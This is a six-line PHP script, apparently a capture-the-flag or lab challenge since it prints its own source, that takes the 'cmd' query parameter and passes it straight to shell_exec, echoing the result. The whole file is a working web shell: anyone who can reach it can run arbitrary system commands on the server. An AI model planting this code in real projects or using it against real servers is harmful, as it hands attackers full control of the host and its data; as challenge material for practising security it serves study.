<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$output = shell_exec($cmd);
echo $output;
?>